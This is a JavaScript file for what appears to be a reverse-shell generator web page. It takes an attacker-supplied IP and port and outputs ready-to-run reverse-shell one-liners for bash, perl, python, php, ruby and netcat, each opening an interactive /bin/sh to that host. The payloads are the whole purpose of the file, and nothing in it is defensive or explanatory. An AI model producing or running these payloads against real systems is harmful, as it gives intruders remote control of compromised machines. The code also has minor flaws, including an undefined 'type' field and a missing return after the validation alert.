document.addEventListener("DOMContentLoaded", function() {
    const btn = document.getElementById('btn');
    const ip = document.getElementById('ip');
    const port = document.getElementById('port');
    const shellH = document.getElementById('shell');

    function showCheatSheet() {
        shells = ['bash', 'perl', 'python', 'php', 'ruby', 'netcat'];
        let shellValue = '';
        shellValue = type.value;
        shellValue = shellValue.toLowerCase();

        if (ip.value === '' || port.value === '' || type.value === '') {
            alert("The IP, PORT and SHELL are required!");
        } 
        
        if (shells.includes(shellValue)) {
            if (shellValue === 'bash') {shellH.innerText = `bash -i >& /dev/tcp/${ip.value}/${port.value} 0>&1`}
            if (shellValue === 'perl') {shellH.innerText = `perl -e 'use Socket;$i="${ip.value}";$p=${port.value};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`}
            if (shellValue === 'python') {shellH.innerText = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip.value}",${port.value}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`}
            if (shellValue === 'php') {shellH.innerText = `php -r '$sock=fsockopen("${ip.value}",${port.value});exec("/bin/sh -i <&3 >&3 2>&3");'`}
            if (shellValue === 'ruby') {shellH.innerText = `ruby -rsocket -e'f=TCPSocket.open("${ip.value}",${port.value}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`}
            if (shellValue === 'netcat') {shellH.innerText = `nc -e /bin/sh ${ip.value} ${port.value}`}
        } else {
            alert("Are you stupid?");
        }
        
    }

    btn.onclick = showCheatSheet;

});